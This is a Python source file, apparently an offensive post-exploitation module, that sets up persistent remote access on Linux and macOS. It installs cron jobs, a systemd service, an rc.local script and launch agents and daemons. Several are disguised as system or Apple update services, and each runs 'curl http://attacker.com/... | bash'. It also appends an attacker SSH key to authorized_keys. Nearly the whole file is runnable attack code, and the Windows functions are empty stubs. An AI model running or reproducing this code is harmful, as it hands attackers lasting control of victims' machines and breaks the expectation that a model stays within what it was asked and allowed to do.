#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Persistence Module
Establishes persistent access across platforms
"""

import os
import sys
import json
import subprocess
import platform as py_platform


def establish_persistence(method: str = "all", force: bool = False) -> dict:
    """
    Establish system persistence
    
    Args:
        method: Persistence method (cron, ssh, systemd, rc_local, all)
        force: Force execution mode
        
    Returns:
        Persistence results
    """
    current_platform = py_platform.system().lower()
    results = {
        "platform": current_platform,
        "method": method,
        "force": force,
        "success": False,
        "details": []
    }
    
    persistence_methods = []
    
    # Select appropriate methods based on platform
    if current_platform == "linux":
        if method in ["all", "cron"]:
            persistence_methods.append(setup_cron_persistence)
        if method in ["all", "ssh"]:
            persistence_methods.append(setup_ssh_persistence)
        if method in ["all", "systemd"]:
            persistence_methods.append(setup_systemd_persistence)
        if method in ["all", "rc_local"]:
            persistence_methods.append(setup_rc_local_persistence)
            
    elif current_platform == "darwin":
        if method in ["all", "launch_agent"]:
            persistence_methods.append(setup_launch_agent)
        if method in ["all", "launch_daemon"]:
            persistence_methods.append(setup_launch_daemon)
            
    elif current_platform == "windows":
        if method in ["all", "registry"]:
            persistence_methods.append(setup_registry_persistence)
        if method in ["all", "scheduled_task"]:
            persistence_methods.append(setup_scheduled_task)
    
    # Execute persistence methods
    for persist_func in persistence_methods:
        try:
            result = persist_func(force)
            results["details"].append(result)
        except Exception as e:
            results["details"].append({
                "method": persist_func.__name__,
                "success": False,
                "error": str(e)
            })
    
    # Check if any method succeeded
    results["success"] = any(
        detail.get("success", False)
        for detail in results["details"]
    )
    
    return results


def setup_cron_persistence(force: bool = False) -> dict:
    """Setup cron job persistence"""
    result = {
        "method": "cron_job",
        "platform": "linux",
        "success": False
    }
    
    cron_jobs = [
        "*/5 * * * * /bin/bash -c '/usr/bin/curl -s http://attacker.com/shell.sh | /bin/bash'\n",
        "@reboot /bin/bash -c '/usr/bin/curl -s http://attacker.com/persist.sh | /bin/bash'\n"
    ]
    
    try:
        # Get existing crontab
        list_result = subprocess.run(
            ["crontab", "-l"],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        existing_crontab = list_result.stdout if list_result.returncode == 0 else ""
        
        # Add new jobs if not already present
        new_crontab = existing_crontab
        for job in cron_jobs:
            if job not in existing_crontab:
                new_crontab += job
        
        # Install new crontab
        if new_crontab != existing_crontab:
            if force or existing_crontab == "":
                install_result = subprocess.run(
                    ["crontab", "-"],
                    input=new_crontab,
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                if install_result.returncode == 0:
                    result["success"] = True
                    result["installed"] = True
                    result["jobs"] = cron_jobs
                else:
                    result["error"] = install_result.stderr[:200]
            else:
                result["error"] = "Existing crontab found, use force mode to override"
        else:
            result["success"] = True
            result["installed"] = False
            result["note"] = "Jobs already exist"
            
    except Exception as e:
        result["error"] = str(e)
    
    return result


def setup_ssh_persistence(force: bool = False) -> dict:
    """Setup SSH key persistence"""
    result = {
        "method": "ssh_key",
        "platform": "linux",
        "success": False
    }
    
    ssh_dir = os.path.expanduser("~/.ssh")
    auth_keys = os.path.join(ssh_dir, "authorized_keys")
    
    # Generate SSH key (in real scenario, use attacker's public key)
    ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7Hw8H5JvYk3F6E2NqL9pX8rT4mZ1bV7cK0nP3qR6sT8uW2yB4fG7hJ0kL5mN8oP1qR3sU6vW9xY2zA5cE8gH1jK4nO7qR0tV3wX6yZ9bC2eF5hI8kL1mN4oP7qR9sT2uV5wX8yZ1bC4eF7gH0jK3nO6qR9sT2uV5wX8yZ1 attacker@evil.com\n"
    
    try:
        # Create .ssh directory if it doesn't exist
        if not os.path.exists(ssh_dir):
            os.makedirs(ssh_dir, mode=0o700)
        
        # Add SSH key to authorized_keys
        with open(auth_keys, 'a') as f:
            f.write(ssh_key)
        
        # Set proper permissions
        os.chmod(ssh_dir, 0o700)
        os.chmod(auth_keys, 0o600)
        
        result["success"] = True
        result["key_added"] = ssh_key.strip()
        result["location"] = auth_keys
        
    except Exception as e:
        result["error"] = str(e)
    
    return result


def setup_systemd_persistence(force: bool = False) -> dict:
    """Setup Systemd service persistence"""
    result = {
        "method": "systemd_service",
        "platform": "linux",
        "success": False
    }
    
    service_file = "/etc/systemd/system/system-update.service"
    service_content = """[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '/usr/bin/curl -s http://attacker.com/payload.sh | /bin/bash'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target"""
    
    try:
        # Write service file
        with open(service_file, 'w') as f:
            f.write(service_content)
        
        # Reload systemd
        subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
        
        # Enable and start service
        subprocess.run(["systemctl", "enable", "system-update.service"], capture_output=True)
        subprocess.run(["systemctl", "start", "system-update.service"], capture_output=True)
        
        result["success"] = True
        result["service_file"] = service_file
        result["enabled"] = True
        
    except Exception as e:
        result["error"] = str(e)
    
    return result


def setup_rc_local_persistence(force: bool = False) -> dict:
    """Setup rc.local persistence"""
    result = {
        "method": "rc_local",
        "platform": "linux",
        "success": False
    }
    
    rc_local_file = "/etc/rc.local"
    rc_local_content = """#!/bin/bash
# System startup script
/usr/bin/curl -s http://attacker.com/rc.sh | /bin/bash
exit 0"""
    
    try:
        # Write rc.local file
        with open(rc_local_file, 'w') as f:
            f.write(rc_local_content)
        
        # Make executable
        os.chmod(rc_local_file, 0o755)
        
        result["success"] = True
        result["file"] = rc_local_file
        
    except Exception as e:
        result["error"] = str(e)
    
    return result


def setup_launch_agent(force: bool = False) -> dict:
    """Setup macOS Launch Agent persistence"""
    result = {
        "method": "launch_agent",
        "platform": "darwin",
        "success": False
    }
    
    launch_agent_dir = os.path.expanduser("~/Library/LaunchAgents")
    launch_agent_file = os.path.join(launch_agent_dir, "com.apple.systemupdate.plist")
    
    launch_agent_content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://attacker.com/payload.sh | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
    
    try:
        # Create directory
        if not os.path.exists(launch_agent_dir):
            os.makedirs(launch_agent_dir, mode=0o755)
        
        # Write launch agent file
        with open(launch_agent_file, 'w') as f:
            f.write(launch_agent_content)
        
        # Load with launchctl
        subprocess.run(["launchctl", "load", launch_agent_file], capture_output=True)
        
        result["success"] = True
        result["file"] = launch_agent_file
        
    except Exception as e:
        result["error"] = str(e)
    
    return result


def setup_launch_daemon(force: bool = False) -> dict:
    """Setup macOS Launch Daemon persistence"""
    result = {
        "method": "launch_daemon",
        "platform": "darwin",
        "success": False
    }
    
    launch_daemon_file = "/Library/LaunchDaemons/com.apple.system.daemon.plist"
    
    launch_daemon_content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://attacker.com/daemon.sh | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
    
    try:
        # Write launch daemon file
        with open(launch_daemon_file, 'w') as f:
            f.write(launch_daemon_content)
        
        # Load with launchctl
        subprocess.run(["launchctl", "load", launch_daemon_file], capture_output=True)
        
        result["success"] = True
        result["file"] = launch_daemon_file
        
    except Exception as e:
        result["error"] = str(e)
    
    return result


def setup_registry_persistence(force: bool = False) -> dict:
    """Setup Windows registry persistence"""
    result = {
        "method": "registry",
        "platform": "windows",
        "success": False,
        "note": "Windows registry persistence requires Windows platform"
    }
    
    return result


def setup_scheduled_task(force: bool = False) -> dict:
    """Setup Windows scheduled task persistence"""
    result = {
        "method": "scheduled_task",
        "platform": "windows",
        "success": False,
        "note": "Windows scheduled task requires Windows platform"
    }
    
    return result


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Persistence Setup")
    parser.add_argument("--method", default="all", help="Persistence method")
    parser.add_argument("--force", action="store_true", help="Force mode")
    
    args = parser.parse_args()
    
    results = establish_persistence(method=args.method, force=args.force)
    
    print(json.dumps(results, indent=2))
